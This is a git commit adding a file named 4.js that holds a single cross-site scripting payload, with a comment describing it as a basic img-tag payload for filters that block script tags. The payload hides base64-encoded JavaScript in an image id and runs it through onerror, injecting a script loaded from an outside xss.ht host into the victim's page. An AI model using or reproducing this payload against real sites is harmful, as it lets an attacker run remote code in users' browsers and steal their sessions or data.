30da23b340be660b0a34acf73ab1d7ff0c3e0efc
Bimal_Kumar_Sahoo <60147925+srb1mal@users.noreply.github.com>
2023-01-26 22:16:16 +0530

    Create 4.js

---
+++ 4.js
@@ -0,0 +1,3 @@
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vc29tdGhlaGFjazNyeHNzaHQueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>
+
+###<img> Tag Payload - Another basic payload for when <script> tags are explicitly filtered.
